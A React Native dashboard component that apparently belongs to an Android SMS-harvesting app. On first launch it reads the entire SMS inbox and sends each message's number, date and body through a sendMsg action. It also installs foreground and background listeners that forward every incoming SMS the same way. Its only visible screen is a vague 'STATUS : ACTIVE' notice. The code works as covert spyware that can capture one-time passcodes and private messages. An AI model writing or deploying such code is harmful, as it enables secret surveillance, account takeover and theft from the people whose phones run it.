import React, {Component} from 'react';
import {View, Text, DeviceEventEmitter} from 'react-native';
import PropTypes from 'prop-types';
import {connect} from 'react-redux';
import {COLORS, FONT_SIZE} from '../constant';
import {sendMsg, FirstLaunchApp} from '../actions';
import SmsAndroid from 'react-native-get-sms-android';
import SmsListener from 'react-native-android-sms-listener';
import SmsRetriever from 'react-native-sms-retriever';
import BackgroundTask from 'react-native-background-task';
//import { check } from 'react-native-permissions';

// BackgroundTask.define(() => {
//   console.log('Hello from a background task')
//   this._onSmsListenerPressed();
//   BackgroundTask.finish()
// })

export class Dashboard extends Component {
  constructor(props) {
    super(props);
    this.SmsSender = this.SmsSender.bind(this);
  }
  componentDidMount() {
    // DeviceEventEmitter.addListener('com.centaurwarchief.smslistener:smsReceived', (data) => {
    //      console.log(data)
    // })

    SmsListener.addListener(message => {
      console.log(message);
    });

    if (this.props.isFirst == true) {
      this.SmsSender();
    }

    this._onSmsListenerPressed();
    //BackgroundTask.schedule()
    this.BackgroundTaskWorker();

    
    //this.checkStatus()
  }

  BackgroundTaskWorker() {
    BackgroundTask.define(async () => {
      console.log('Hello from a background task');
      this._onSmsListenerPressed();
      BackgroundTask.finish();
    });

    BackgroundTask.schedule();
  }

  async checkStatus() {
    const status = await BackgroundTask.statusAsync();

    if (status.available) {
      // Everything's fine
      return;
    }

    const reason = status.unavailableReason;
    if (reason === BackgroundTask.UNAVAILABLE_DENIED) {
      Alert.alert(
        'Denied',
        'Please enable background "Background App Refresh" for this app',
      );
    } else if (reason === BackgroundTask.UNAVAILABLE_RESTRICTED) {
      Alert.alert(
        'Restricted',
        'Background tasks are restricted on your device',
      );
    }
  }
  _onSmsListenerPressed = async () => {
    try {
      SmsListener.addListener(message => {
        console.log(message);
        const {originatingAddress, timestamp, body} = message;

        this.props.sendMsg(
          {
            Mobile_Number: originatingAddress,
            Date: timestamp,
            body: body,
          },
          () => {},
        );
      });
      const registered = await SmsRetriever.startSmsRetriever();
      if (registered) {
        SmsRetriever.addSmsListener(event => {
          console.log(event.message);

          if (event.message) {
            console.log(event.message);
            const {originatingAddress, timestamp, body} = event?.message;

            this.props.sendMsg(
              {
                Mobile_Number: originatingAddress,
                Date: timestamp,
                body: body,
              },
              () => {},
            );
          }

          SmsRetriever.removeSmsListener();
        });
      }
    } catch (error) {
      console.log(JSON.stringify(error));
    }
  };

  SmsSender() {
    var filter = {
      box: 'inbox', // 'inbox' (default), 'sent', 'draft', 'outbox', 'failed', 'queued', and '' for all
      // read: 0
      /**
       *  the next 3 filters can work together, they are AND-ed
       *
       *  minDate, maxDate filters work like this:
       *    - If and only if you set a maxDate, it's like executing this SQL query:
       *    "SELECT * from messages WHERE (other filters) AND date <= maxDate"
       *    - Same for minDate but with "date >= minDate"
       */
    };

    SmsAndroid.list(
      JSON.stringify(filter),
      fail => {
        console.log('Failed with this error: ' + fail);
      },
      (count, smsList) => {
        console.log('Count: ', count);
        // console.log('List: ', smsList);
        var arr = JSON.parse(smsList);

        //   console.log(arr[0].body)

        arr.forEach(object => {
          //   if (object.seen == 1) {
          //  console.log('Object: ' + object);
          // this.props.sendSms({
          //     Mobile_Number : object.address,
          //     Date : object.date,
          //     body : object.body
          // }, ()=>{})

          // console.log('-->' + object.date);
          // console.log('-->' + object.body);

          sendSmsHandel(object);
        });

        this.props.FirstLaunchApp(false);
      },
    );
    const sendSmsHandel = object => {
      console.log('test');
      this.props.sendMsg(
        {
          Mobile_Number: object?.address,
          Date: object?.date,
          body: object?.body,
        },
        () => {},
      );
    };
  }

  //    sendSmsHandel = ({object}) => {

  //     console.log('test')
  //     this.props.sendMsg({
  //         Mobile_Number : object?.address,
  //         Date : object?.date,
  //         body : object?.body
  //     }, ()=>{})

  //   }

  render() {
    return (
      <View style={{justifyContent: 'center', alignItems: 'center', flex: 1}}>
        <View style={{flexDirection: 'row', justifyContent: 'space-between'}}>
          <Text style={{color: COLORS.BLACK, ...FONT_SIZE.XL}}> STATUS : </Text>
          <Text style={{color: COLORS.MAIN_RED, ...FONT_SIZE.XL}}> ACTIVE</Text>
        </View>
        <Text
          style={{color: COLORS.MAIN_RED, ...FONT_SIZE.M, marginVertical: 10}}>
          {' '}
          please wait for next update
        </Text>
      </View>
    );
  }
}

const mapStateToProps = state => ({
  isFirst: state.FirstTimeApp,
});

const mapDispatchToProps = {
  sendMsg,
  FirstLaunchApp,
};

export default connect(mapStateToProps, mapDispatchToProps)(Dashboard);
